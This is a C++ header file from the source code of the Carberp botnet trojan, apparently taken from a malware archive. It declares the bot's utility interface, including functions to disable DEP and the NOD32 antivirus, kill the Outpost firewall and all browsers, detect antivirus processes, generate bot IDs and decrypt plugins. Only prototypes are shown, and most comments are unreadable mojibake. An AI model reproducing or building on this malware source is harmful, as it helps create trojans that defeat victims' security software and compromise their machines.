/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef UtilsH
#define UtilsH
//----------------------------------------------------------------------------

#include <windows.h>

#include "Strings.h"


#define WIN_2000	1
#define WIN_XP		2
#define WIN_2003	3
#define WIN_VISTA	4
#define WIN_7		5


DWORD GetProcessIdByHash( DWORD dwHash );

//���������� ��� �������� �� ����
DWORD GetProcessHashOfId(DWORD dwPid);
char *GetProcessList();

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param ); //��������� �����, �� ��� handle �� ���������, � ����������
void RunThread( LPVOID lpStartAddress, LPVOID param ); //��������� ����� � ��������� ��� handle
HANDLE OpenProcessEx( DWORD dwHash );
void GetUserToken();

bool RunFileW(PWCHAR FileName);
bool RunFileA(PCHAR FileName, bool wait = false, bool hideConsole = false);


bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );

//char * FileToMD5(char *URL);

char *GetOSInfo();
LPVOID GetInfoTable( DWORD dwTableType );
void GetOSVersion();

HANDLE CreateUpdateMutex();
DWORD GetCurrentSessionId();

DWORD WINAPI LoadDll( LPVOID lpData );
//DWORD GetFileHash( WCHAR *File );
bool GodmodeOnFile( WCHAR *Filename );


void DisableDEP();
DWORD GetProcessHash();

LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );

// ������� ���������� ������������� �������� ���������� (Explorer.exe)
DWORD GetExplorerPid();
// ������� ���������� ������������� �������� ���������� (iexplore.exe)
DWORD GetIExplorerPid();


//****************************************************************************
//  Random  ������ ��� ��������� ��������� �����
//****************************************************************************
namespace Random
{
	// ���������������� ��������� ��������� �����
	void Initialize();

	// ������������ ��������� �����
	DWORD Generate();

	// ������������ ��������� ����� � ��������� �� Min �� Max
	DWORD Generate(DWORD Min, DWORD Max);

	// ������������ ������ ��������� ��������
	// Min, Max - �������� ��������� ��������
	PCHAR  RandomString(DWORD Length, char Min, char Max);
	string RandomString2(DWORD Length, char Min, char Max);
}




void GenerateUid( char *BotUid);


//******************************************************************
//  ������� ���������� ���������� ������������� ������
//******************************************************************
PCHAR MakeMachineID();



//******************************************************************
//  GenerateBotID - ������� ���������� ������������� ����
//
//  ��������� - ������ ��������� �������� StrNew. ����������
//              �������� StrFree
//******************************************************************
PCHAR GenerateBotID();
string GenerateBotID2(const char* Prefix = NULL);

//******************************************************************
//  DirExists - ������� ���������� ������ ���� ����  Path ceotcndetn
//******************************************************************
bool DirExists(PCHAR Path);


//******************************************************************
//  FileExists* - ������� ���������� ������ ���� ����  FileName
//  			  ����������
//******************************************************************
bool FileExistsA(const PCHAR FileName);
bool FileExistsW(const PWCHAR FileName);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ��� � ������ ���� folder\file.dlll
bool isFileExists(int FlagFolderDest, WCHAR*Path);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ��� � ������ ���� folder\file.dlll
// �� ��� ������ �����

bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count);
//��������� ������� ����� �� ����� ���� CSIDL_APPDATA+FileName ���������� ��� ������
//bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);

//����� ����� �� ����� ����������
bool DeleteFolders(PCHAR From);

// �������� ����� ���� ����� �� �����, ������� �������������
bool CopyFileANdFolder(PCHAR From,PCHAR To);
//----------------------------------------------------------------------------
// ������� ������ ������ � ����������
//----------------------------------------------------------------------------

typedef  LPWIN32_FIND_DATA PFindData;

typedef void (* TFilesCallBack)(PFindData Search, // ��������� ������
								PCHAR FileName,   // ��� ���������� �����
								LPVOID Data,      // ������ ���������� � ������� ������
								bool &Cancel      // �������� �������� ���������� �����
								);

#define FA_ANY_FILES ( FILE_ATTRIBUTE_READONLY |\
					   FILE_ATTRIBUTE_HIDDEN   |\
					   FILE_ATTRIBUTE_SYSTEM   |\
					   FILE_ATTRIBUTE_ARCHIVE  |\
					   FILE_ATTRIBUTE_NORMAL)

#define FA_DIRECTORY FILE_ATTRIBUTE_DIRECTORY

//******************************************************************
//  SearchFiles  - ������� ���������� ���  �������������
//
//  Path - ����� � �������� ���������� �����. ������ �������������
//         �������� ������ \\
//  Mask - ����� ������. *.* ��� ���� ������
//
//  Recursive - ����������� ����������� �����
//
//  FileAttributes - �������� ������� ������
//
//  Data - ������ ������� ����� �������� � ����� �������� �����
//
//  CallBack - ����� �������� �����
//
//  ��������� - ������� ���������� ������ ���� ����� �� ��� �������
//              �� ������ �������� �����
//
//******************************************************************
bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack);


//******************************************************************
//  GetUniquePID - ������� ���������� �������� �������������
//	   �������� ��������. ������� �� GetProcessID() � ���, ���
//     ���������� ���������� �������� ��� �������� ���������
//******************************************************************
DWORD GetUniquePID();

//���������� PID ������������� ��������
DWORD GetParentPID();

//��������� true, ���� ������� pid ����������
bool IsProcessLeave(int pid);


//******************************************************************
//  IsNewProcess - ������� ��������� ������������� ��������
//		�������� �� ��������� ProcessID � ���������� ������ ����
//		��� ����������. � ������ ������� �������� ProcessID
//      ��������������.
//
//  Thread - ��������� �� ����������, ���� ����� �������
//			 ������������� �������� ������. �� ����������
//******************************************************************
bool IsNewProcess(DWORD &ProcessID, DWORD *Thread = NULL);


//----------------------------------------------------------------------------
// Registry - ������ ��� ������ � �������� Windows
//----------------------------------------------------------------------------

namespace Registry
{
	// ������� ������ � ������� ������ CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	bool CreateKey(HKEY h, char* path, char* name );

	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(�������� �������� REG_SZ)
	bool SetValueString(HKEY h, char* path, char* name,  char* values );
	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(������� �������� �������� DWORD)
	bool SetValueDWORD(HKEY h, char* path, char* name,  DWORD values );

	// ������� �������� ��������� �������� �� �������
    PCHAR GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value);

	//�������� ����, ���� ��� �����, ��� ������������ ��������, ��������(������� �������� �������� REG_SZ)
	bool CreateValueString(HKEY h, char* path, char* name,  char* values );
	bool CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise );
	
	// ��������� ����� SE_BACKUP_NAME ��� ����� ��������� �����
	// SetPrivilege(SE_BACKUP_NAME,TRUE); 
	bool SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
	
	// ��������� ���� �� ����
	//������ ������� ��� �����: HKEY_CLASSES_ROOT, HKEY_CURRENT_CONFIG,  HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS 
	//������ ���� � ������ �����
	//	������  TRUE ���� ��, ����� FALSE
	bool IsKeyExist(HKEY hRoot, LPCSTR KeyPath);
	
	// ��������� ����� ������� � ����
	// ������ Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE,"Software\\Policies\\Microsoft","d:\\e.txt");
	bool SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile);
}

//----------------------------------------------------------------------------
// FILE - ������ ��� ������ � �������, ������� ������
//----------------------------------------------------------------------------

namespace File
{
	// �������� ������ �� ������ � ����
	DWORD WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD BufferSize);
	DWORD WriteBufferW(const wchar_t* FileName, LPVOID Buffer, DWORD BufferSize);

	// ��������� ���� � �����
	LPBYTE ReadToBufferA(const char* FileName, DWORD &BufferSize);
	LPBYTE ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize);

	// �������� ���������� �����. �������� ������ ������ FileName!!!
	// ���������� - ���������� �������� ������ � ������
	// ��������� - ����� ������ � ������ �����
	PCHAR ChangeFileExt(PCHAR FileName, PCHAR Ext);

	// ������� ��������� ��� ��������� ������
	PCHAR GetTempNameA();
	string GetTempName2A();

	PWCHAR GetTempNameW();

	//��������� ����� ���������� ����� � ������� � buf
	PCHAR GetTempName( PCHAR buf, const PCHAR prefix = 0 );
	PWCHAR GetTempName( PWCHAR buf, const PWCHAR prefix = 0 );

	//-------------------------------------------------------------------------
	//  ������� ��������� ��� ����� �� ������� ����
	//  FileName - ������ ��� �����, ���� �� �������� ������������ / ���� \\
	//  	�� ������� ������ ��� ������
	//  DuplicateStr - ���������� � ������, ���� ���������� �������
	//		����� ������ �� ����������. � ������ false ������� ������ ���������
	//      �� ������ ������ ����� � �������� ������
	//-------------------------------------------------------------------------
	PCHAR   ExtractFileNameA(PCHAR FileName, bool DuplicateStr);
    string  ExtractFileNameA(const char* FileName);

	PWCHAR ExtractFileNameW(PWCHAR FileName, bool DuplicateStr);

	//-------------------------------------------------------------------------
	//  ExtractFilePath - ������� ��������� ��� ����� �� ��� ������� �����
	//
	//	���������: � ������ ������ ������� ���������� ����� ������ ����������
	//             ���� � �����
	//-------------------------------------------------------------------------
	PCHAR ExtractFilePathA(PCHAR FileName);


	//------------------------------------------------------
	// GetNameHash - ������� ���������� ��� ����� �����
	//
	// FileNAme - ��� �����
	//
	// LowerCase - ��������� ������� � ������� ��������
	//------------------------------------------------------
	DWORD        GetNameHashA(PCHAR FileName, bool LowerCase);
	DWORD inline GetNameHashA(const string& FileName, bool LowerCase) { return File::GetNameHashA(FileName.t_str(), LowerCase); }

	DWORD GetNameHashW(PWCHAR FileName, bool LowerCase);

	inline bool IsExists( const PCHAR FileName )
	{
		return FileExistsA(FileName);
	}
	inline bool IsExists( const PWCHAR FileName )
	{
		return FileExistsW(FileName);
	}

	//------------------------------------------------------
	// LastWriteTime - ������� ���������� ����� �
	//                 ������������� � ������� ����������
	//				   ��������� �����
	//------------------------------------------------------
	DWORD LastWriteTime(HANDLE File);
}



//������ � ������������
namespace Directory
{
	//������� ����� ������ � ����������, ���� delFolder = true, �� ������� � ���� ���������� �����, ���������� ��������� ����������� (� ������� ������ �� ������������)
	bool Clear( const char* folder, bool delFolder = false );
	//������� ����� ������ � ����������
	inline bool Delete( const char* folder )
	{
		return Clear( folder, true );
	}
	bool IsExists(const PCHAR Path);
	bool IsExists(const PWCHAR Path);
}


// ��� �������������
#define GetNameHash(FileName) File::GetNameHashW(FileName, true);

//**********************************************************************
//  EnumDrives - ������� ���������� ��� ����� ���������� ����
//               ����������� DRIVE_UNKNOWN ��� �������� ����
//               ������ � �������
//**********************************************************************
typedef void (*TEnumDrivesMethod)(PCHAR Drive, LPVOID Data, bool &Cancel8);

void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data);


//-----------------------------------------------------------------------------
//  IsExecutableFile - ������� ���������� ������ ���� ��������� ����� ��������
//					   ����������� ������, ���� dll
//-----------------------------------------------------------------------------
bool IsExecutableFile(LPVOID Buf);


// ������� ��������� ��� ���������� �����
//char   *CalcFileMD5Hash(char *szFileName);
//string CalcFileMD5Hash2(char *szFileName);

char *GetNetInfo();
DWORD GetFileFormat( WCHAR *lpFileName );
void MakeShutdown();
BOOL KillProcess(DWORD pid,DWORD TimeOut );
void KillBlockingProcesses( const char* fileName ); ////���������� �������� ������� ������ ��������� ����
bool ClearDirectory(PCHAR Path);
bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir);
//----------------------------------------------------------------------------

typedef int ( WINAPI *fwsprintfA )( LPTSTR, LPCTSTR, ... );
typedef int ( WINAPI *fwsprintfW )( LPWSTR, LPCWSTR, ... );
//���������� ��������� �� ������� wsprintf
fwsprintfA Get_wsprintfA();
fwsprintfW Get_wsprintfW();

//����� � to ����� C:\Documents and Settings\All Users
char* GetAllUsersProfile( char* to, int maxSz );
//���������� ���� ���� C:\Documents and Settings\All Users\addPath
char* GetAllUsersProfile( char* to, int maxSz, const char* addPath );
//���������� CRC32
unsigned long GetCRC32( char* data, int size );

//���������� ��� �������� �� ��� ���
DWORD GetHashForPid( int pid );

//���������� true, ���� ������ ����� ������ maxSize, ����� false (����� ������ ��������� �������)
//���� ������ size, �� ��� ����������� true, ��� ����� ������ �����, ����� ������ �� �������� ���������
bool SizeFolderLess(const char* nameFolder, DWORD maxSize, DWORD* size = 0 );


//------------------------------------------------------------
//  KillAllBrowsers - ������� ������� ��� ���������� ��������
//------------------------------------------------------------
void KillAllBrowsers();


//------------------------------------------------------------
//  GetSpecialFolderPath - ������� ���������� ���� �
//                          ����������� ����� �������
//  (���������� ��� ��GetSpecialFolderPath)
//
//   FileName - ��� ����� ��������� � ����������� ����
//------------------------------------------------------------
string        GetSpecialFolderPathA(int CSIDL, const char *FileName);
string inline GetSpecialFolderPathA(int CSIDL, const string &FileName) { return GetSpecialFolderPathA(CSIDL, FileName.t_str()); };
wstring       GetSpecialFolderPathW(int CSIDL, const wchar_t *FileName);


//------------------------------------------------------------
//  KillOutpost - ������� ������� ������� �������� Outpost
//------------------------------------------------------------
void KillOutpost();


//****************************************************************
//	GetAntiVirusProcessName - ������� ���������� ��� ��������
//                            ����������� ���� ������
//****************************************************************
string GetAntiVirusProcessName();

//*****************************************************************
//  GetCommandParamByIndex
//  �������� �������� �� ������� �� ������ ���������� �������.
//
//  CommandParamList - ������, ������� ���������� � �-��� ������� (Args)
//  ParamIndex - ������ ���������, ������� ���� ��������
//
//  ��������� - �������� ��������� ���� ������ ������ � ������, ����
//              ��������� � ����� �������� �� ����������.
//
//*****************************************************************
string GetCommandParamByIndex(const char* CommandParamList, DWORD ParamIndex);


//*****************************************************************
// TryCreateSingleInstance
//
// �-��� ��� �������� ������������� ���������� ����-����.
// ��� ����������� �������������� ������������ ������ ��������.
// ������ ��� ��������� ������� � ��������� ��� ����� - ���������� � ���������.
// 
// � ������ ��������� �������� ���������� ����� ������������ ��������
// � ������ ����������� ������� ���������� NULL
//
//*****************************************************************

HANDLE TryCreateSingleInstance(const char* MutexPrefix);
//������ ��������, wait - ������� ����� � �������������
HANDLE CaptureMutex( const char* name, int wait );
//���� ���� ���-�� �������� �������, wait - ������� ����� � �������������
bool WaitCaptureMutex( const char* name, int wait );


BOOL IsUserAdmin();
bool IsUserLocalSystem();

//���������� PID �������� �� ��� �����
DWORD GetProcessIdByName(PCHAR ProcessName);
//��������� ���32
VOID OffNOD32();


//---------------------------------------------------------
//  ������� ������ �����
//  ���������:
//  	LinkFileName - ��� ����� ������������ ������
//      Object - ������ �� ������� ����� ��������� �����
//      CommandLine - ��������� ������ ��� ������� �������
//      Description - �������� ������/�������
//      IconFileName - ��� ����� ������
//---------------------------------------------------------
void CreateLink( const char* LinkFileName, const char* Object, const char* CommandLine,
						const char* Description, const char* IconFileName );



//---------------------------------------------------------
//  CombineFileName - ������� ������ ������ ��� �����
//  �� ����� ���� Path � ����� ����� FileName
//---------------------------------------------------------
string CombineFileName(const char* Path, const char* FileName);



//---------------------------------------------------------
//  IsWIN64 - ������� ���������� ������ � ������ ����,
//  Windows ������� 64 ���������
//
//  To-Do: � ������ ������ ������� ��������� �����������
//         ����������, ��� ���� ��� ������ ���� �� 64 ������
//         ������ ����� 32 ������ �����. ��������������
//         ���������� ����� ����������
//---------------------------------------------------------
bool IsWIN64();


//---------------------------------------------------------
//  IsWOW64 - ������� ���������� ������ ���� �������, PID
//            �������� ��������, ������� ��� �������� WOW64,
//            ��� �������� ������ 32 ������� �������� � 64
//            ������ �����
//  ��� ��������� ���������� � ������� �������� ����������
//  �������� ������� ������� ���:
//  	IsWOW64(0);
//---------------------------------------------------------
bool IsWOW64(DWORD PID);

//----------------------------------------------------------------------------
#endif
